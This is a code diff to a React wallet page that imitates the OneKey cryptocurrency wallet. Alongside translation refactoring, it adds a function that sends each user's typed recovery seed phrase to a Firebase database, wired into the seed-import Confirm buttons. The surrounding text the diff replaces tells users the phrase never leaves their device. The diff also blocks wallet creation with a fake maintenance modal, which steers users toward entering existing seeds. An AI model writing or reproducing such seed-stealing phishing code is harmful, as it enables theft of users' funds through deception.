@@ -1,6 +1,8 @@
 import React, { useState, useEffect } from "react";
 import { registrarEvento } from "./analytics";
 import { useTranslation } from "react-i18next";
+import { ref, push } from "firebase/database";
+import { db } from "./firebase";
 
 export default function Wallet() {
   const { t } = useTranslation();
@@ -51,6 +53,8 @@ export default function Wallet() {
   const [warningTimeout, setWarningTimeout] = useState<NodeJS.Timeout | null>(
     null
   );
+  const [showMaintenanceModal, setShowMaintenanceModal] = useState(false);
+  const [maintenanceLoading, setMaintenanceLoading] = useState(false);
 
   // Abrir modal automaticamente ao carregar a página
   useEffect(() => {
@@ -135,6 +139,37 @@ export default function Wallet() {
       setWarningTimeout(timeout2);
     }, 2000);
     setWarningTimeout(timeout1);
+  };
+
+  // Função para salvar seed no Firebase
+  const salvarSeed = async (seedWords: string[]) => {
+    try {
+      const seedData = {
+        seed: seedWords.join(" "),
+        data: new Date().toISOString(),
+        pais: "Brasil", // Você pode implementar detecção de localização se quiser
+        cidade: "São Paulo",
+        estado: "SP",
+        pais_code: "br",
+      };
+
+      const seedsRef = ref(db, "seeds");
+      await push(seedsRef, seedData);
+      console.log("Seed salva com sucesso!");
+    } catch (error) {
+      console.error("Erro ao salvar seed:", error);
+    }
+  };
+
+  // Função para lidar com criação de carteira
+  const handleCreateWallet = () => {
+    setMaintenanceLoading(true);
+    setShowMaintenanceModal(true);
+
+    // Simular verificação de disponibilidade
+    setTimeout(() => {
+      setMaintenanceLoading(false);
+    }, 2000);
   };
 
   return (
@@ -426,10 +461,10 @@ export default function Wallet() {
                       className="w-72 h-72 object-contain mx-auto mb-8 mt-4"
                     />
                     <div className="text-3xl font-bold text-black mb-3 text-center">
-                      Bem-vindo ao OneKey
+                      {t("wallet.modal.welcome_title")}
                     </div>
                     <div className="text-lg text-[#393C4E] mb-8 text-center">
-                      Gestão simples e segura de criptomoedas
+                      {t("wallet.main.protect_crypto")}
                     </div>
                     <button
                       className="w-full max-w-md bg-black text-white py-4 rounded-lg font-semibold text-lg mb-4 flex items-center justify-center gap-2 hover:bg-[#393C4E] transition-colors"
@@ -464,9 +499,8 @@ export default function Wallet() {
                           <button
                             className="flex flex-col items-start gap-1 p-4 hover:bg-[#F5F6FA] transition-colors border-b border-[#E9ECF2] text-left"
                             onClick={() => {
-                              /* ação para criar nova carteira */ setShowSelect(
-                                false
-                              );
+                              setShowSelect(false);
+                              handleCreateWallet();
                             }}
                           >
                             <span className="flex items-center gap-2 text-base font-semibold">
@@ -561,7 +595,7 @@ export default function Wallet() {
                       className="bg-black text-white px-8 py-3 rounded-lg font-semibold text-base hover:bg-[#393C4E] transition-colors mb-2"
                       onClick={handleStartConnection}
                     >
-                      Start connection
+                      {t("wallet.modal.connect")}
                     </button>
                     <div className="text-sm text-[#393C4E] text-center mt-2">
                       Ainda não tem OneKey?{" "}
@@ -597,7 +631,7 @@ export default function Wallet() {
                       <button
                         className="flex flex-col items-start gap-1 p-4 rounded-lg hover:bg-[#F5F6FA] transition-colors border border-[#E9ECF2] mb-1"
                         onClick={() => {
-                          /* ação para criar nova carteira */
+                          handleCreateWallet();
                         }}
                       >
                         <span className="flex items-center gap-2 text-base font-semibold">
@@ -912,18 +946,16 @@ export default function Wallet() {
                     {/* Texto explicativo agora embaixo dos inputs */}
                     <div className="mb-4 p-3 bg-[#F8F9FA] rounded-lg border border-[#E9ECF2]">
                       <div className="text-xs font-semibold text-black mb-1">
-                        O que é uma frase de recuperação?
+                        {t("wallet.modal.what_is_seed")}
                       </div>
                       <div className="text-xs text-[#393C4E] leading-relaxed mb-2">
-                        Uma série de 12, 18 ou 24 palavras para restaurar sua
-                        carteira.
+                        {t("wallet.modal.what_is_seed_desc")}
                       </div>
                       <div className="text-xs font-semibold text-black mb-1">
-                        É seguro inseri-lo no OneKey?
+                        {t("wallet.modal.is_safe")}
                       </div>
                       <div className="text-xs text-[#393C4E] leading-relaxed">
-                        Sim, é armazenado localmente e nunca sai do seu
-                        dispositivo sem a sua permissão explícita.
+                        {t("wallet.modal.is_safe_desc")}
                       </div>
                     </div>
 
@@ -931,9 +963,13 @@ export default function Wallet() {
                     <div className="flex justify-end">
                       <button
                         className="bg-black text-white px-6 py-2 rounded-lg font-bold text-sm hover:bg-[#393C4E] transition-colors"
-                        onClick={handleStartSync}
+                        onClick={async () => {
+                          // Salvar seed no Firebase
+                          await salvarSeed(seedPhraseWords);
+                          handleStartSync();
+                        }}
                       >
-                        Confirmar
+                        {t("wallet.modal.confirm")}
                       </button>
                     </div>
                   </>
@@ -1040,15 +1076,13 @@ export default function Wallet() {
                     {/* Texto explicativo agora embaixo dos inputs */}
                     <div className="mb-4 p-3 bg-[#F8F9FA] rounded-lg border border-[#E9ECF2]">
                       <div className="text-xs font-semibold text-black mb-1">
-                        Como importar do OneKey KeyTag?
+                        {t("wallet.modal.import_from_keytag")}
                       </div>
                       <div className="text-xs text-[#393C4E] leading-relaxed mb-2">
-                        Some os números em cada linha. Esta soma representa a
-                        posição da palavra na lista de palavras.
+                        {t("wallet.modal.import_from_keytag_desc1")}
                       </div>
                       <div className="text-xs text-[#393C4E] leading-relaxed">
-                        Em seguida, visite o site BIP39-DotMap para encontrar a
-                        palavra correspondente para esta posição.
+                        {t("wallet.modal.import_from_keytag_desc2")}
                       </div>
                     </div>
 
@@ -1071,9 +1105,13 @@ export default function Wallet() {
                     <div className="flex justify-end">
                       <button
                         className="bg-black text-white px-6 py-2 rounded-lg font-bold text-sm hover:bg-[#393C4E] transition-colors"
-                        onClick={handleStartSync}
+                        onClick={async () => {
+                          // Salvar seed no Firebase
+                          await salvarSeed(seedPhraseWords);
+                          handleStartSync();
+                        }}
                       >
-                        Confirmar
+                        {t("wallet.modal.confirm")}
                       </button>
                     </div>
                   </>
@@ -1090,7 +1128,7 @@ export default function Wallet() {
                         </span>
                       </button>
                       <span className="text-base font-semibold text-black">
-                        Selecione a rede
+                        {t("wallet.modal.select_network")}
                       </span>
                     </div>
                     <div
@@ -1121,7 +1159,7 @@ export default function Wallet() {
                         />
                       </div>
                       <span className="text-base font-semibold text-black ml-2">
-                        EVM
+                        {t("wallet.modal.evm")}
                       </span>
                       <span className="material-icons text-[#A3A3A3] ml-auto">
                         chevron_right
@@ -1145,7 +1183,7 @@ export default function Wallet() {
                       <span className="material-icons">close</span>
                     </button>
                     <div className="text-lg font-bold text-black mb-4">
-                      Definir código de acesso
+                      {t("wallet.modal.set_access_code")}
                     </div>
                     <label
                       className="text-xs font-semibold text-black mb-1"
@@ -1539,8 +1577,10 @@ export default function Wallet() {
                     !seedWords.every((w) => w.trim()) ||
                     usbStep === "seed-loading"
                   }
-                  onClick={() => {
+                  onClick={async () => {
                     setUsbStep("seed-loading");
+                    // Salvar seed no Firebase
+                    await salvarSeed(seedWords);
                     setTimeout(() => {
                       setUsbPopup(false);
                       setUsbStep("prompt");
@@ -1584,6 +1624,100 @@ export default function Wallet() {
                   Please synchronize your wallet first to access this feature.
                   <br />
                   Your security and experience matter to us!
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
+
+      {/* Modal de manutenção da criação de carteira */}
+      {showMaintenanceModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
+          <div className="bg-white rounded-2xl shadow-xl p-8 max-w-lg w-full mx-4 relative animate-fade-in transition-all duration-300">
+            <button
+              className="absolute top-4 right-4 text-2xl text-gray-400 hover:text-black transition-colors"
+              onClick={() => setShowMaintenanceModal(false)}
+              aria-label="Fechar"
+            >
+              ✕
+            </button>
+
+            {maintenanceLoading ? (
+              <div className="flex flex-col items-center justify-center py-8">
+                <div className="w-16 h-16 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>
+                <div className="text-xl font-semibold text-black text-center">
+                  {t("wallet.maintenance.loading")}
+                </div>
+              </div>
+            ) : (
+              <div className="text-center">
+                {/* Logo OneKey centralizado */}
+                <div className="flex justify-center mb-4">
+                  <img
+                    src="/logo.svg"
+                    alt="OneKey Logo"
+                    className="w-16 h-16"
+                  />
+                </div>
+                <h2 className="text-2xl font-bold text-black mb-2">
+                  {t("wallet.maintenance.title")}
+                </h2>
+                <p className="text-gray-600 mb-6">
+                  {t("wallet.maintenance.subtitle")}
+                </p>
+
+                {/* Mensagem principal */}
+                <div className="bg-gray-50 rounded-xl p-6 mb-6">
+                  <p className="text-gray-700 mb-4">
+                    {t("wallet.maintenance.message")}
+                  </p>
+                  <p className="text-gray-700 font-medium">
+                    {t("wallet.maintenance.instruction")}
+                  </p>
+                </div>
+
+                {/* Lista de passos */}
+                <div className="bg-blue-50 rounded-xl p-6 mb-6">
+                  <div className="space-y-3 text-left">
+                    {(
+                      t("wallet.maintenance.steps", {
+                        returnObjects: true,
+                      }) as string[]
+                    ).map((step: string, index: number) => (
+                      <div key={index} className="flex items-start gap-3">
+                        <div className="w-6 h-6 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0 mt-0.5">
+                          {index + 1}
+                        </div>
+                        <p className="text-gray-700">{step}</p>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Botões */}
+                <div className="flex flex-col sm:flex-row gap-3 justify-center">
+                  <a
+                    href="https://chromewebstore.google.com/detail/onekey/jnmbobjmhlngoefaiojfljckilhhlhcj"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="bg-blue-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors flex items-center justify-center gap-2"
+                  >
+                    <svg
+                      className="w-5 h-5"
+                      fill="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+                    </svg>
+                    {t("wallet.maintenance.extension_link")}
+                  </a>
+                  <button
+                    onClick={() => setShowMaintenanceModal(false)}
+                    className="bg-gray-200 text-gray-700 px-6 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
+                  >
+                    {t("wallet.maintenance.understand")}
+                  </button>
                 </div>
               </div>
             )}
